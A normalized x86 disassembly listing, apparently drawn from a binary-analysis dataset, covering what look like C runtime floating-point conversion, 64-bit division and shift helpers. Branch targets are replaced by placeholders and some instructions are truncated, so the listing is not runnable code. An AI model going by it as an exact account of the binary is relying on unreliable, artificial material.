inc [ eax ]
sub_1003ae2c
mov edi edi
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
movzx eax [ edx + 0x6 ]
push ebx
mov ecx eax
push esi
push edi
shr ecx 0x4
and eax 0x8000
mov edi 0x7ff
and ecx edi
mov [ ebp + 0xc ] eax
mov eax [ edx + 0x4 ]
mov edx [ edx ]
movzx ebx cx
mov esi 0x80000000
and eax 0xfffff
mov [ ebp - 0x4 ] esi
test ebx ebx
je r-xdata
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp ebx edi
je r-xdata
add ecx 0x3c01
mov [ ebp - 0x4 ] ebx
cmp edx ebx
jne r-xdata
mov edi 0x7fff
jmp r-xdata
add ecx 0x3c00
jmp r-xdata
mov ecx [ ebp + 0xc ]
or ecx edi
mov ecx [ eax ]
mov edx [ eax + 0x4 ]
mov ebx ecx
add edx edx
shr ebx 0x1f
or edx ebx
add ecx ecx
add edi 0xffff
mov [ eax + 0x4 ] edx
mov [ eax ] ecx
test esi edx
je r-xdata
mov eax [ ebp + 0x8 ]
mov cx [ ebp + 0xc ]
mov [ eax + 0x4 ] ebx
mov [ eax ] ebx
jmp r-xdata
mov ecx edx
shr ecx 0x15
shl eax 0xb
or ecx eax
or ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
shl edx 0xb
mov [ eax + 0x4 ] ecx
mov [ eax ] edx
test esi ecx
jne r-xdata
movzx edi cx
pop edi
pop esi
mov [ eax + 0x8 ] cx
pop ebx
leave
retn
sub_1003aee9
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x10 ]
push esi
mov [ ebp - 0x30 ] eax
push edi
lea eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1003ae2c
pop ecx
pop ecx
lea eax [ ebp - 0x2c ]
push eax
push 0x0
push 0x11
sub esp 0xc
lea esi [ ebp - 0x10 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsw [ edi ] [ esi ]
call sub_1003d281
mov esi [ ebp - 0x30 ]
mov [ ebx + 0x8 ] eax
movsx eax [ ebp - 0x2a ]
mov [ ebx ] eax
movsx eax [ ebp - 0x2c ]
mov [ ebx + 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
push [ ebp + 0x18 ]
push esi
call sub_1002e87c
add esp 0x24
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
mov [ ebx + 0xc ] esi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10027150
leave
retn
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100276d9
add esp 0x14
sub_1003af80
push edi
push esi
push ebp
xor edi edi
xor ebp ebp
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
inc ebp
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x18 ]
mov ecx eax
mov eax esi
mul [ esp + 0x18 ]
add edx ecx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
dec ebp
jns r-xdata
dec esi
sub eax [ esp + 0x18 ]
sbb edx [ esp + 0x1c ]
cmp edx [ esp + 0x14 ]
ja r-xdata
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
dec edi
jne r-xdata
neg edx
neg eax
sbb edx 0x0
jb r-xdata
pop ebp
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
xor ebx ebx
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1003b060
cmp cl 0x40
jae r-xdata
xor eax eax
xor edx edx
retn
cmp cl 0x20
jae r-xdata
mov eax edx
xor edx edx
and cl 0x1f
shr eax cl
retn
shrd eax edx cl
shr edx cl
retn
sub_1003b07f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
and eax 0xfff7ffff
and ecx eax
push esi
test ecx 0xfcf0fce0
je r-xdata
mov esi [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
test esi esi
je r-xdata
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
cmp edi esi
je r-xdata
call sub_1003dcd3
call sub_1003dcd3
mov [ esi ] eax
jmp r-xdata
call sub_1002d4db
push 0x16
pop edi
push esi
push esi
push esi
push esi
push esi
mov [ eax ] edi
call sub_10027801
add esp 0x14
mov eax edi
pop edi
jmp r-xdata
push esi
push esi
call sub_1003dcd3
pop ecx
pop ecx
mov [ edi ] eax
pop ecx
pop ecx
xor eax eax
pop esi
pop ebp
retn
sub_1003b0eb
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1003b62f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
movzx ecx [ eax + 0xa ]
push ebx
mov ebx ecx
and ecx 0x8000
mov [ ebp - 0x14 ] ecx
mov ecx [ eax + 0x6 ]
mov [ ebp - 0x20 ] ecx
mov ecx [ eax + 0x2 ]
movzx eax [ eax ]
and ebx 0x7fff
sub ebx 0x3fff
shl eax 0x10
push edi
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x18 ] eax
cmp ebx 0xffffc001
jne r-xdata
and [ ebp + 0x8 ] 0x0
push esi
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] eax
jns r-xdata
xor ebx ebx
xor eax eax
lea edi [ ebp + eax * 4 - 0x20 ]
push 0x1f
xor eax eax
pop ecx
sub ecx edx
inc eax
shl eax cl
mov [ ebp - 0x8 ] ecx
test [ edi ] eax
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
push 0x2
stosd [ edi ]
pop eax
jmp r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ecx [ ebp - 0x8 ]
or eax 0xffffffff
shl eax cl
and [ edi ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
mov eax [ ebp - 0xc ]
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
push 0x1f
pop ecx
sub ecx [ rw-data ]
shl ebx cl
mov ecx [ ebp - 0x14 ]
neg ecx
sbb ecx ecx
and ecx 0x80000000
or ebx ecx
mov ecx [ rw-data ]
or ebx [ ebp - 0x20 ]
cmp ecx 0x40
jne r-xdata
cmp [ ebp + eax * 4 - 0x20 ] ebx
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
cmp ecx 0x20
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp - 0x1c ]
mov [ ecx + 0x4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov eax [ rw-data ]
mov ecx eax
sub ecx [ rw-data ]
cmp ebx ecx
jge r-xdata
inc ebx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp + 0xc ]
mov [ ecx ] ebx
cmp ebx eax
jg r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
and [ ebp - 0x4 ] 0x0
sub ecx esi
xor edx edx
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
add esi edx
mov [ ebp + 0x8 ] esi
mov esi [ ecx ]
cmp [ ebp + 0x8 ] esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
cmp ebx [ rw-data ]
mov ecx [ rw-data ]
jl r-xdata
sub eax [ ebp - 0x10 ]
lea esi [ ebp - 0x2c ]
mov ecx eax
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
cdq
and edx 0x1f
add eax edx
movsd [ edi ] [ esi ]
mov edx ecx
sar eax 0x5
and edx 0x8000001f
movsd [ edi ] [ esi ]
jns r-xdata
push 0x2
xor ebx ebx
pop eax
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x8 ] edx
jmp r-xdata
mov eax [ rw-data ]
and [ ebp - 0x20 ] 0x7fffffff
add ebx eax
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
xor eax eax
lea edi [ ebp - 0x20 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
or [ ebp - 0x20 ] 0x80000000
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
pop esi
test ecx ecx
je r-xdata
mov [ ebp + 0x8 ] ecx
jae r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or esi 0xffffffff
mov ecx edx
shl esi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not esi
dec edx
or edx 0xffffffe0
inc edx
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
mov [ ebp + 0x8 ] esi
cmp esi edx
jb r-xdata
dec eax
mov edx [ ebp + 0x8 ]
mov [ ecx ] edx
mov ecx [ ebp - 0x4 ]
jns r-xdata
mov ecx [ ebp + 0x8 ]
mov edi [ ebp + ecx * 4 - 0x20 ]
mov ecx edi
and ecx esi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr edi cl
mov ecx [ ebp + 0x8 ]
or edi [ ebp - 0xc ]
mov [ ebp + ecx * 4 - 0x20 ] edi
mov edi [ ebp - 0x10 ]
mov ecx [ ebp - 0x4 ]
shl edi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] edi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp esi 0x1
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
cmp edx eax
jl r-xdata
mov esi [ rw-data ]
dec esi
lea ecx [ esi + 0x1 ]
mov eax ecx
cdq
and edx 0x1f
add eax edx
sar eax 0x5
mov edx ecx
and edx 0x8000001f
mov [ ebp - 0xc ] eax
jns r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
xor eax eax
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
cmp edx eax
jl r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
lea ebx [ ecx + eax ]
xor eax eax
inc eax
jmp r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
push 0x1f
pop ecx
sub ecx edx
xor edx edx
inc edx
shl edx cl
lea ebx [ ebp + eax * 4 - 0x20 ]
mov [ ebp - 0x10 ] ecx
test [ ebx ] edx
je r-xdata
dec edx
or edx 0xffffffe0
inc edx
mov ecx [ ebp - 0x10 ]
or eax 0xffffffff
shl eax cl
and [ ebx ] eax
mov eax [ ebp - 0xc ]
inc eax
cmp eax 0x3
jge r-xdata
or edx 0xffffffff
shl edx cl
not edx
test [ ebp + eax * 4 - 0x20 ] edx
jmp r-xdata
mov ecx [ rw-data ]
inc ecx
mov eax ecx
cdq
and edx 0x1f
add eax edx
mov edx ecx
sar eax 0x5
and edx 0x8000001f
jns r-xdata
push 0x3
pop ecx
lea edi [ ebp + eax * 4 - 0x20 ]
sub ecx eax
xor eax eax
[ edi ]
jne r-xdata
and [ ebp - 0xc ] 0x0
and [ ebp + 0x8 ] 0x0
or edi 0xffffffff
mov ecx edx
shl edi cl
mov [ ebp - 0x4 ] 0x20
sub [ ebp - 0x4 ] edx
not edi
dec edx
or edx 0xffffffe0
inc edx
mov eax esi
cdq
push 0x1f
pop ecx
and edx ecx
add eax edx
sar eax 0x5
and esi 0x8000001f
jns r-xdata
inc eax
cmp eax 0x3
jl r-xdata
mov ebx [ ebp + 0x8 ]
lea ebx [ ebp + ebx * 4 - 0x20 ]
mov esi [ ebx ]
mov ecx esi
and ecx edi
mov [ ebp - 0x10 ] ecx
mov ecx edx
shr esi cl
mov ecx [ ebp - 0x4 ]
or esi [ ebp - 0xc ]
mov [ ebx ] esi
mov esi [ ebp - 0x10 ]
shl esi cl
inc [ ebp + 0x8 ]
cmp [ ebp + 0x8 ] 0x3
mov [ ebp - 0xc ] esi
jl r-xdata
mov esi eax
push 0x2
shl esi 0x2
lea ecx [ ebp - 0x18 ]
pop edx
sub ecx esi
and [ ebp + 0x8 ] 0x0
xor edx edx
sub ecx esi
inc edx
shl edx cl
lea ecx [ ebp + eax * 4 - 0x20 ]
mov esi [ ecx ]
lea edi [ esi + edx ]
cmp edi esi
jb r-xdata
dec esi
or esi 0xffffffe0
inc esi
cmp [ ebp + eax * 4 - 0x20 ] 0x0
jmp r-xdata
and [ ebp + edx * 4 - 0x20 ] 0x0
mov esi [ ecx ]
mov [ ebp + edx * 4 - 0x20 ] esi
jmp r-xdata
mov [ ebp + 0x8 ] 0x1
cmp edi edx
jae r-xdata
cmp edx eax
jl r-xdata
dec edx
sub ecx 0x4
test edx edx
jge r-xdata
dec eax
jns r-xdata
mov [ ecx ] edi
mov ecx [ ebp + 0x8 ]
jmp r-xdata
test ecx ecx
je r-xdata
lea ecx [ ebp + eax * 4 - 0x20 ]
mov edx [ ecx ]
lea esi [ edx + 0x1 ]
xor edi edi
cmp esi edx
jb r-xdata
xor edi edi
inc edi
cmp esi 0x1
jae r-xdata
mov [ ecx ] esi
mov ecx edi
sub_1003bb73
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
xor ecx ecx
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ebx
mov [ ebp - 0x58 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x50 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_1002d4db
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_10027801
add esp 0x14
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
